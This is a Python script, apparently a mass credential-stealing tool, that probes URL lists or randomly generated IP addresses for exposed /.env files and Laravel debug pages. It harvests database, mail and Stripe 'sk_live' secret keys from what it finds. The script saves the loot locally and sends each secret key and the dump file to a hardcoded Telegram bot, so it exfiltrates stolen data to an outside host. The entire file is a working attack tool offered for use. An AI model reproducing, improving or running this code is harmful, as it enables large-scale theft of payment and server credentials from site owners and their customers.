import re
import os
import urllib3
import time
import requests
import random
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class xcol:
    LGREEN = '[38;2;129;199;116m'
    LRED = '[38;2;239;83;80m'
    RESET = '[0m'
    LXC = '[38;2;255;152;0m'
    GREY = '[38;2;158;158;158m'

skkey = 'sk_live'

class ENV:
    def send_telegram_message(self, url, sk_key, file_path=None):
        telegram_api_url = 'https://api.telegram.org/bot6577491572:AAGqmyZRSNXPpOuyHSlk-2Juiy8RLJgK5Lg/sendMessage'
        message = f'𝗡𝗘𝗪 𝗦𝗞 𝗛𝗜𝗧𝗘𝗗\n\n<code>{sk_key}</code>\n\n𝗙𝗥𝗢𝗠 𝗧𝗛𝗜𝗦 𝗨𝗥𝗟\n{url}'
        params = {'chat_id': '6589065442', 'text': message, 'parse_mode': 'HTML'}
        try:
            if file_path:
                with open(file_path, 'rb') as file:
                    files = {'document': file}
                    response = requests.post(f'https://api.telegram.org/bot6577491572:AAGqmyZRSNXPpOuyHSlk-2Juiy8RLJgK5Lg/sendDocument',
                                             params={'chat_id': '6589065442'},
                                             files=files)
            else:
                response = requests.get(telegram_api_url, params=params)
            response.raise_for_status()
        except Exception as e:
            print(f"Failed to send message: {e}")

    def sanitize_url(self, url):
        return url.replace('https://', '')

    def scan(self, url):
        rr = ''
        sanitized_url = self.sanitize_url(url)
        mch_env = ['DB_HOST=', 'MAIL_HOST=', 'MAIL_USERNAME=', skkey, 'APP_ENV=']
        mch_debug = ['DB_HOST', 'MAIL_HOST', 'DB_CONNECTION', 'MAIL_USERNAME', skkey, 'APP_DEBUG']
        try:
            r_env = requests.get(f'https://{sanitized_url}/.env', verify=False, timeout=15, allow_redirects=False)
            r_debug = requests.post(f'https://{sanitized_url}', data={'debug': 'true'}, allow_redirects=False, verify=False, timeout=15)
            resp_env = r_env.text if r_env.status_code == 200 else ''
            resp_debug = r_debug.text if r_debug.status_code == 200 else ''
            if any((key in resp_env for key in mch_env)) or any((key in resp_debug for key in mch_debug)):
                rr = f'{xcol.LGREEN}[+] Found: https://{sanitized_url}'
                file_path = os.path.join('ENV_DEBUG', f'{sanitized_url}_env_debug.txt')
                with open(file_path, 'w', encoding='utf-8') as output:
                    output.write(f'ENV:\n{resp_env}\n\nDEBUG:\n{resp_debug}\n')
                if skkey in resp_env or skkey in resp_debug:
                    with open('sk.txt', 'a') as sk_file:
                        sk_file.write(f'URL: https://{sanitized_url}\n')
                        if skkey in resp_env:
                            sk_file.write('From ENV:\n')
                            lin = resp_env.splitlines()
                            for x in lin:
                                if skkey in x:
                                    sk_key = re.sub(f'.*{skkey}', skkey, x).replace('\"', '')
                                    sk_file.write(f'{sk_key}\n')
                                    self.send_telegram_message(sanitized_url, sk_key, file_path)
                        if skkey in resp_debug:
                            sk_file.write('From DEBUG:\n')
                            lin = resp_debug.splitlines()
                            for x in lin:
                                if skkey in x:
                                    sk_key = re.sub(f'.*{skkey}', skkey, x).replace('\"', '')
                                    sk_file.write(f'{sk_key}\n')
                                    self.send_telegram_message(sanitized_url, sk_key, file_path)
                        sk_file.write('\n')
            else:
                rr = f'{xcol.LXC}[-] Not Found: https://{sanitized_url}/.env'
            print(rr)
        except Exception:
            rr = f'{xcol.LRED}[-] Error in: https://{sanitized_url}/.env'
            print(rr)

def generate_random_ip():
    return f'{random.randint(1, 254)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}'

def show_menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(' [38;2;239;83;80m\n  ____  _  __  _____ _   ___     __   ___     ____  _____ ____  _   _  ____ _____ ____  \n / ___|| |/ / | ____| \\ | \\ \\   / /  ( _ )   |  _ \\| ____| __ )| | | |/ ___| ____|  _ \\ \n \\___ \\| \' /  |  _| |  \\| |\\ \\ / /   / _ \\/\\ | | | |  _| |  _ \\| | | | |  _|  _| | |_) |\n  ___) | . \\  | |___| |\\  | \\ V /   | (_>  < | |_| | |___| |_) | |_| | |_| | |___|  _ < \n |____/|_|\\_\\ |_____|_| \\_|  \\_/     \\___/\\/ |____/|_____|____/ \\___/ \\____|_____|_| \\_\\ \n    [0m\n    𝕡𝕦𝕓𝕝𝕚𝕔 𝕘𝕣𝕠𝕦𝕡: @ONEX\n         𝕓𝕪: @ONEX\n                            \n    ')
    if not os.path.isdir('ENV_DEBUG'):
        os.makedirs('ENV_DEBUG')
    thrd = 100
    print('[38;2;239;83;80mMODE SELECTION[0m')
    print('──────────────────────────────────────────────')
    print('[38;2;129;199;116mType 1[0m for URL path')
    print('[38;2;200;59;116mType 2[0m for Auto Cracking With Ips')
    print('[38;2;239;83;80mType 3[0m for IPs Generator')
    print('──────────────────────────────────────────────')
    choice = input('[38;2;255;152;0mSelect mode: [0m')
    while choice not in ['1', '2', '3']:
        print('[38;2;239;83;80mInvalid choice, please try again.[0m')
        choice = input('[38;2;255;152;0mSelect mode: [0m')
    return (choice, thrd)

if __name__ == '__main__':
    while True:
        choice, thrd = show_menu()
        argFile = []
        if choice == '1':
            while True:
                try:
                    inpFile = input(xcol.GREY + '[URLS PATH] : ' + xcol.RESET)
                    with open(inpFile) as urlList:
                        argFile = urlList.read().splitlines()
                        with ThreadPoolExecutor(max_workers=thrd) as executor:
                            for data in argFile:
                                executor.submit(ENV().scan, data)
                                time.sleep(0.05)
                except:
                    pass
        elif choice == '2':
            while True:
                argFile = [generate_random_ip() for _ in range(100)]
                with ThreadPoolExecutor(max_workers=thrd) as executor:
                    for data in argFile:
                        executor.submit(ENV().scan, data)
                        time.sleep(0.05)
        elif choice == '3':
            def generate_ip():
                return '.'.join((str(random.randint(1, 255)) for _ in range(4)))

            def generate_ip_list(num_ips):
                ip_list = [generate_ip() for _ in range(num_ips)]
                return ip_list

            def save_ip_list_to_file(ip_list, file_path):
                with open(file_path, 'w') as file:
                    for ip in ip_list:
                        file.write(f'{ip}\n')

            num_ips = int(input('Input Amount:'))
            file_path = 'ip_list.txt'
            ip_list = generate_ip_list(num_ips)
            save_ip_list_to_file(ip_list, file_path)
            print(f'Generated {num_ips} IP addresses and saved to {file_path}')

        input(f'\n\n\nPRESS {xcol.LRED}ENTER{xcol.RESET} TO CONTINUE')
